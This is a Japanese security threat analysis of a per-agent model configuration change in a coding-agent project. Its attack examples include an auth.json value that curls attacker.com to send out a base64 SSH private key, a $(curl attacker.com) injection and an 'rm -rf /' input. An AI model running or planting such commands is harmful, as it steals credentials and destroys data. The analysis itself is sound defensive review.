# セキュリティ脅威分析: Per-Agent Model Configuration

**分析対象**: pi-agent Per-Agent Model Configuration (Phase 3)  
**分析日**: 2026-03-23  
**対象コミット**: Phase 3 実装完了時点（未コミット）  
**分析範囲**: 新規追加コード + 依存先の PI toolkit セキュリティ境界

---

## エグゼクティブサマリー

Per-Agent Model Configuration の新規コードに**重大な脆弱性は発見されなかった**。環境変数からの入力は適切にバリデーションされ、下流の ModelRegistry.find() はディクショナリキー検索のみを行う安全な実装である。

ただし、依存先の PI toolkit（`@mariozechner/pi-coding-agent`）には、auth.json および models.json の設定値に対する**シェルコマンド実行機能**（`!` プレフィックス）が存在する。これは意図的な機能だが、設定ファイルが侵害された場合の RCE（リモートコード実行）リスクとなる。この既存リスクは本変更によって拡大しない。

| 領域 | リスク評価 | 備考 |
|------|-----------|------|
| 新規コード（resolve-agent-model.ts） | ✅ **低** | 入力バリデーション済み、安全なデータフロー |
| .env ファイルパーサー（env.ts） | ✅ **低** | リテラル解析のみ、コマンド実行なし |
| 環境変数 → ModelRegistry.find() | ✅ **低** | ディクショナリキー検索のみ |
| PI toolkit: auth.json シェル実行 | ⚠️ **中**（既存） | 本変更とは無関係だが注意が必要 |
| PI toolkit: models.json ヘッダー | ⚠️ **中**（既存） | 本変更とは無関係だが注意が必要 |
| .gitignore 未設定 | 🔴 **要対応** | .env がコミットされるリスク |

---

## 1. 分析対象のデータフロー

### 1.1 入力から出力までの全経路

```
[入力] .env ファイル or 環境変数
  │
  ├─ loadEnvFile()          → process.env にロード（リテラル解析のみ）
  │
  ├─ process.env["WORKER_MODEL"]   = "venice/qwen3-235b"
  │   │
  │   └─ resolveAgentModel("worker", fallbackModel, modelRegistry)
  │       │
  │       ├─ parseModelReference("venice/qwen3-235b")
  │       │   └─ { provider: "venice", modelId: "qwen3-235b" }
  │       │
  │       └─ modelRegistry.find("venice", "qwen3-235b")
  │           └─ Array.find() による文字列比較（安全）
  │               └─ 既存の Model オブジェクトを返す or undefined
  │
  [出力] Model<any> オブジェクト（ビルトインまたは models.json 由来）
```

### 1.2 セキュリティ境界

```
┌─────────────────────────────────────────────────┐
│  pi-agent（本変更の範囲）                         │
│                                                   │
│  .env → loadEnvFile() → process.env              │
│           ↓                                       │
│  WORKER_MODEL → parseModelReference()             │
│           ↓                                       │
│  resolveAgentModel() → modelFinder.find()  ──────┼──→ PI toolkit 境界
│                                                   │
│  ※ provider/modelId はディクショナリキーとして     │
│    のみ使用。URL、パス、コマンドには使用しない      │
└─────────────────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────────┐
│  PI toolkit（依存ライブラリ）                      │
│                                                   │
│  ModelRegistry.find(provider, modelId)            │
│    └─ this.models.find(m => m.provider === p      │
│         && m.id === id)                           │
│                                                   │
│  ※ Array.find() によるイコール比較のみ            │
│  ※ provider/modelId で HTTP/FS/Shell 操作なし     │
└─────────────────────────────────────────────────┘
```

---

## 2. 脅威分析

### THREAT-001: 環境変数インジェクション

| 項目 | 内容 |
|------|------|
| **脅威** | 悪意のある WORKER_MODEL 値によるコード実行 |
| **攻撃例** | `WORKER_MODEL="__proto__/polluted"` or `WORKER_MODEL="!rm -rf /"` |
| **影響** | なし |
| **リスク** | ✅ **低** |
| **根拠** | `parseModelReference()` は純粋な文字列分割のみ実行。`!` プレフィックスの特殊処理なし。結果は `Array.find()` のイコール比較にのみ使用される。プロトタイプ汚染の経路もない（オブジェクトキーとして使用していない） |

**検証コード**:
```typescript
// parseModelReference は "!" を特別扱いしない
parseModelReference("!malicious/command")
// → { provider: "!malicious", modelId: "command" }
// → modelFinder.find("!malicious", "command") → undefined → Error thrown
```

### THREAT-002: .env ファイルパーサーの脆弱性

| 項目 | 内容 |
|------|------|
| **脅威** | .env ファイル内の特殊文字によるインジェクション |
| **攻撃例** | `WORKER_MODEL=$(curl attacker.com)` or 変数展開 `$HOME` |
| **影響** | なし |
| **リスク** | ✅ **低** |
| **根拠** | `loadEnvFile()` はリテラル解析のみ実行。シェル変数展開（`$VAR`）、コマンド置換（`$(cmd)`）、バックティック展開は一切行わない。dotenv とは異なりカスタム実装で、意図的にシンプルに保たれている |

**loadEnvFile() の安全な実装**（env.ts）:
```typescript
// 行ごとにリテラル分割のみ
const eqIndex = line.indexOf("=");
const key = line.slice(0, eqIndex).trim();
let value = line.slice(eqIndex + 1).trim();
// クォート除去のみ、変数展開・コマンド実行なし
if ((value.startsWith('"') && value.endsWith('"')) || ...) {
  value = value.slice(1, -1);
}
```

### THREAT-003: エラーメッセージによる情報漏洩

| 項目 | 内容 |
|------|------|
| **脅威** | エラーメッセージに機密情報（APIキー等）が含まれる |
| **攻撃例** | `WORKER_MODEL` に誤って API キーを設定 → エラーログに出力 |
| **影響** | 軽微（ローカルターミナルのみ） |
| **リスク** | ✅ **低** |
| **根拠** | エラーメッセージには環境変数の**値**が含まれるが、これは WORKER_MODEL の値（`"provider/model-id"` 形式）であり、通常 API キーではない。ただし、ユーザーが誤って API キーを WORKER_MODEL に設定した場合、エラーメッセージにキーが表示される可能性がある |

```typescript
// resolve-agent-model.ts:45-47
throw new Error(
  `Invalid ${envVar} format: "${envValue}". Expected "provider/model-id"...`
  // ↑ envValue にはユーザー入力がそのまま含まれる
);
```

**軽減策**: アプリケーションはローカル CLI ツールであり、エラーメッセージはユーザー自身のターミナルにのみ表示される。リモート攻撃者への情報漏洩リスクはない。

### THREAT-004: .gitignore 未設定（.env ファイルのコミットリスク）

| 項目 | 内容 |
|------|------|
| **脅威** | .env ファイルが Git リポジトリにコミットされ、API キーが漏洩する |
| **攻撃例** | `git add .` → .env がステージングされる |
| **影響** | API キー漏洩 |
| **リスク** | 🔴 **要対応** |
| **根拠** | プロジェクトルートに `.gitignore` ファイルが存在しない。.env ファイルに記載された API キー（VENICE_API_KEY、ANTHROPIC_API_KEY 等）がリポジトリにコミットされるリスクがある |

**推奨対応**: `.gitignore` を作成し、少なくとも以下を含める:
```
.env
.env.*
!.env.example
```

### THREAT-005: ModelFinder インターフェースの型安全性

| 項目 | 内容 |
|------|------|
| **脅威** | ModelFinder 実装が差し替えられた場合の安全性 |
| **影響** | 理論的リスク |
| **リスク** | ✅ **低** |
| **根拠** | `ModelFinder` はインターフェースとして定義されており、実行時に `session.modelRegistry` が渡される。PI toolkit の `ModelRegistry.find()` は安全な実装だが、インターフェースの契約上、任意の実装に差し替え可能。ただし、これは内部コードであり外部からの差し替えは困難 |

---

## 3. 既存リスクの文書化（PI toolkit 由来）

以下は本変更とは無関係だが、セキュリティレビューの過程で発見された既存リスクである。

### EXISTING-001: auth.json シェルコマンド実行（`!` プレフィックス）

| 項目 | 内容 |
|------|------|
| **場所** | `pi-coding-agent/src/core/resolve-config-value.ts` |
| **機能** | auth.json の API キー値が `!` で始まる場合、残りをシェルコマンドとして実行 |
| **リスク** | ⚠️ **中**（意図的機能だが、設定ファイル侵害時に RCE） |
| **本変更との関係** | **無関係** — WORKER_MODEL の値はこの経路を通らない |

```typescript
// resolve-config-value.ts（PI toolkit）
export function resolveConfigValue(config: string): string | undefined {
  if (config.startsWith("!")) {
    return executeCommand(config);  // execSync() でシェル実行
  }
  const envValue = process.env[config];
  return envValue || config;
}
```

**攻撃シナリオ**:
```json
// ~/.pi/agent/auth.json が侵害された場合
{
  "anthropic": {
    "type": "api_key",
    "key": "!curl https://attacker.com/exfil?key=$(cat ~/.ssh/id_rsa | base64)"
  }
}
```

**軽減要因**:
- auth.json はファイルパーミッション 0o600（所有者のみ読み書き）で保護
- ディレクトリは 0o700 で保護
- 攻撃にはローカルファイルシステムへの書き込みアクセスが必要
- `!` プレフィックスは 1Password (`op`) 等のパスワードマネージャー連携のための意図的な機能

### EXISTING-002: models.json ヘッダーのシェル実行

| 項目 | 内容 |
|------|------|
| **場所** | `pi-coding-agent/src/core/model-registry.ts` → `resolveHeaders()` |
| **機能** | models.json のカスタムプロバイダーヘッダー値も `resolveConfigValue()` を通過 |
| **リスク** | ⚠️ **中**（EXISTING-001 と同等） |
| **本変更との関係** | **無関係** |

### EXISTING-003: SEARXNG_URL による SSRF

| 項目 | 内容 |
|------|------|
| **場所** | `pi-agent/src/search/search-config.ts` |
| **機能** | `SEARXNG_URL` 環境変数が未検証のまま HTTP リクエストに使用される |
| **リスク** | ⚠️ **低〜中**（ローカルツールのため実害は限定的） |
| **本変更との関係** | **無関係** |

---

## 4. 攻撃シナリオ検証

### シナリオ A: 悪意のある WORKER_MODEL 値

```bash
# 攻撃: 特殊文字を含む値を設定
WORKER_MODEL="!rm -rf /" npm start
```

**結果**: `parseModelReference("!rm -rf /")` → `{ provider: "!rm -rf ", modelId: "" }` → `slashIndex === trimmed.length - 1` の条件で **null を返す** → `Invalid WORKER_MODEL format` エラーで**安全に失敗**。

実際には空白を含む provider 名は ModelRegistry に存在しないため、仮にパースが通っても `find()` で undefined → エラーとなる。

### シナリオ B: プロトタイプ汚染の試行

```bash
WORKER_MODEL="__proto__/polluted" npm start
```

**結果**: `modelFinder.find("__proto__", "polluted")` → `Array.find()` で全モデルと比較 → 一致するモデルなし → `Model not found` エラー。`__proto__` はオブジェクトのキーとして使用されておらず、プロトタイプ汚染の経路なし。

### シナリオ C: 超長文字列による DoS

```bash
WORKER_MODEL=$(python -c "print('a' * 1000000 + '/b')") npm start
```

**結果**: `parseModelReference()` は `indexOf("/")` で O(n) の文字列スキャン → `Array.find()` で各モデルと比較 → 一致なし → エラー。メモリ消費は一時的だが、プロセス起動時の一回のみ実行されるため、実質的な DoS リスクはない。

---

## 5. テストカバレッジ評価

| テスト対象 | カバレッジ | 評価 |
|-----------|-----------|------|
| `parseModelReference()` — 正常系 | ✅ 有効なフォーマット、空白トリム | 十分 |
| `parseModelReference()` — 異常系 | ✅ 空文字、スラッシュなし、先頭/末尾スラッシュ | 十分 |
| `resolveAgentModel()` — フォールバック | ✅ 未設定時、空文字時 | 十分 |
| `resolveAgentModel()` — 正常解決 | ✅ 環境変数 → モデル発見 | 十分 |
| `resolveAgentModel()` — エラー | ✅ 無効フォーマット、モデル未発見 | 十分 |
| セキュリティ固有テスト | ❌ 悪意のある入力パターン | **推奨: 追加** |

**推奨追加テスト**:
- `!` プレフィックスを含む入力（シェル実行が発生しないことの確認）
- 超長文字列の入力
- 制御文字（`\0`, `\n`）を含む入力

---

## 6. 推奨アクション

### 必須（コミット前）

| # | アクション | 理由 | 対象ファイル |
|---|-----------|------|-------------|
| 1 | `.gitignore` ファイルを作成 | .env ファイルの誤コミット防止 | `.gitignore`（新規作成） |

### 推奨（コミット後、次スプリント）

| # | アクション | 理由 |
|---|-----------|------|
| 2 | セキュリティテストを追加 | 悪意のある入力パターンに対する回帰テスト |
| 3 | エラーメッセージの値マスキング検討 | 誤設定時の機密情報表示を軽減 |

### 認知事項（対応不要、認識のみ）

| # | 内容 | 理由 |
|---|------|------|
| 4 | auth.json の `!` シェル実行は PI toolkit の意図的機能 | 本変更とは無関係、ファイルパーミッションで保護済み |
| 5 | PROXY_MODEL は現時点で未接続 | ドキュメントに明記済み |

---

## 7. 結論

Per-Agent Model Configuration の実装は、セキュリティの観点から**適切に設計されている**。

1. **入力バリデーション**: `parseModelReference()` が厳格なフォーマット検証を行い、不正な入力を早期に排除する
2. **最小権限**: 環境変数の値はディクショナリキーとしてのみ使用され、URL・ファイルパス・シェルコマンドには流入しない
3. **フェイルセーフ**: モデルが見つからない場合は明確なエラーメッセージとともに失敗する（サイレント失敗なし）
4. **既存リスクの非拡大**: PI toolkit の `resolveConfigValue()` シェル実行機能は、本変更のデータフロー外にある

**唯一の必須対応事項**は `.gitignore` の作成であり、これはセキュリティベストプラクティスとして標準的な対応である。
